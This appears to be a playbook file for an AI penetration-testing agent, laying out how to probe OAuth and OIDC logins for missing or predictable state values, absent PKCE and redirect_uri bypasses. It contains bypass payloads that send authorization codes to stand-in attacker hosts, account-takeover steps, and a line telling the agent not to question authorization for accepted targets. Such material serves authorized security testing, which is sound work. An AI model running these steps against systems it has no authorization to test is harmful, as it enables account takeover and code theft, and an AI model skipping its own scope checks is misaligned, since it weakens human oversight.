# C7_oauth_state_pkce

Test OAuth 2.0 and OIDC flows for missing or predictable `state` parameter CSRF, absent PKCE (`code_challenge`), and `redirect_uri` parser-bypass. A successful state-CSRF attack lets an adversary inject a known authorization code into a victim's session (account takeover). A redirect_uri bypass lets the adversary steal the authorization code by redirecting it to an attacker-controlled host. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface has an OAuth or OIDC login flow (`/oauth/authorize`, `/auth/callback`, `/login/oauth/authorize`, `response_type=code`, `client_id` params visible in traffic).
- Recon or JS analysis reveals OAuth provider URLs, client IDs, and redirect URIs.
- Bug-class hints include `oauth`, `csrf`, `state-missing`, `pkce`, `redirect-uri-bypass`.
- Both an `attacker` account and a `victim` account are registered.

---

## Workflow

1. **Load assignment and map the OAuth flow.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   From traffic summary or by triggering the login flow, capture the full authorization URL:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/auth/login", auth_profile: "attacker", egress_profile })
   ```
   Parse the Location header for `client_id`, `redirect_uri`, `state`, `scope`, `code_challenge`, `code_challenge_method`.

2. **Test missing state parameter.**
   Initiate the authorization flow without a `state` parameter:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/oauth/authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid", egress_profile })
   ```
   If the authorization server proceeds without requiring `state`, it is vulnerable to CSRF. Record the absence.

3. **Test predictable state.**
   If `state` is present, analyze the value: if it is a sequential integer, timestamp, UUIDv1, or fixed string, it is predictable. Attempt to replay a previously captured `state` value in a new session:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/auth/callback?code=REAL_CODE&state=REUSED_STATE", auth_profile: "victim", egress_profile })
   ```
   If the server accepts the replayed state, record as CSRF vulnerability.

4. **CSRF exploitation proof.**
   As attacker: initiate the OAuth flow but do not complete it. Capture the `code` from your own authorization grant (using attacker credentials at the provider). As victim (separate session): visit the callback URL with the attacker's code and (known/absent) state:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/auth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE_OR_EMPTY", auth_profile: "victim", egress_profile })
   ```
   If the victim's session is now logged in as the attacker's OAuth identity, this is a full ATO-via-CSRF.

5. **Test missing PKCE.**
   Check whether the authorization URL includes `code_challenge` and `code_challenge_method`. If absent, test whether the token endpoint accepts an authorization code without `code_verifier`:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/oauth/token", body: { grant_type: "authorization_code", code: "VALID_CODE", redirect_uri: "Y", client_id: "X" }, egress_profile })
   ```
   A missing PKCE requirement means any party that intercepts the authorization code can exchange it for tokens.

6. **Redirect URI parser bypass.**
   Test redirect_uri variations that a lenient parser accepts but that redirect to attacker-controlled endpoints:
   - Subdomain: `redirect_uri=https://attacker.example.com` (if `example.com` is the registered base)
   - Path traversal: `redirect_uri=https://app.example.com/callback/../../../attacker`
   - Open-redirect via registered path: `redirect_uri=https://app.example.com/redirect?url=https://attacker.com`
   - Query-string injection: `redirect_uri=https://app.example.com/callback%3Finjected=...`
   - URL fragment: `redirect_uri=https://app.example.com/callback#https://attacker.com`
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/oauth/authorize?client_id=X&redirect_uri=<BYPASS_VALUE>&response_type=code&state=TEST", egress_profile })
   ```
   If the authorization server redirects to the bypass URI, capture the Location header as evidence. Then request a real authorization code using the bypass redirect_uri and confirm it arrives at the attacker-controlled endpoint.

7. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/oauth/authorize", method: "GET", bug_class: "oauth_state_csrf", auth_profile: "attacker", status: "promising"|"tested", evidence_summary: "state param absent in authorization response" }] })
   ```

8. **Record chain attempt.**
   ```
   mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "oauth-csrf-to-ato", step: "state_absent_confirmed", evidence: "Authorization server issues code without requiring state", outcome: "partial_evidence" })
   ```

9. **Record finding.**
   Call `mantis_list_findings` first. Record:
   ```
   mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "OAuth missing state parameter — CSRF to account takeover", severity: "high", cwe: "CWE-352", endpoint: "/oauth/authorize", description: "...", proof_of_concept: "<full request/response chain>", response_evidence: "...", impact: "Attacker can inject authorization code into victim session, logging victim into attacker-controlled account", validated: true })
   ```

10. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["OAuth state-CSRF feeds C8 CSRF-to-SSO chain", "redirect_uri bypass feeds C11 open-redirect chain"] })
    ```

11. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "csrf_replay", notes: "Fresh victim session; replay attacker code in callback URL" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full authorization URL showing absent or predictable `state` parameter.
- Full token exchange request and response (confirming code accepted without PKCE verifier if applicable).
- For redirect_uri bypass: the Location header from the authorization server pointing to the attacker-controlled URI.
- For CSRF exploitation: session state before and after callback injection (victim logged in as attacker identity).
- HTTP response bodies confirming identity confusion (victim's profile page showing attacker's account data).

---

## Stop conditions

- Authorization server enforces `state` with unpredictable entropy and rejects replayed values.
- PKCE is enforced: token exchange without `code_verifier` returns 400.
- All redirect_uri bypass variants return 400 or redirect to a safe error page.
- Two WAF blocks on redirect_uri manipulation — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Same-browser CSRF test.** Initiating and completing the OAuth flow in the same browser session is not a CSRF proof. Use separate sessions (separate auth profiles) to demonstrate cross-session injection.
- **State present but unused.** The authorization server may include `state` in the response but not validate it. Confirm validation by submitting a mismatched `state` — if accepted, it is still vulnerable.
- **Provider-side fix, client-side absent.** Some authorization servers enforce state; the client application must also verify it on return. Test both sides independently.
- **redirect_uri whitelist with path prefix.** A strict prefix match (`https://app.example.com/callback`) is usually safe. Only report bypass if the actual redirect occurs to an unintended destination.

---

## Next chain

Feeds into **C8_csrf_to_sso** (chain the CSRF into an SSO escalation), **C11_open_redirect_chain** (use redirect_uri bypass as the open-redirect leg), and **C12_account_takeover** (full ATO via CSRF code injection).
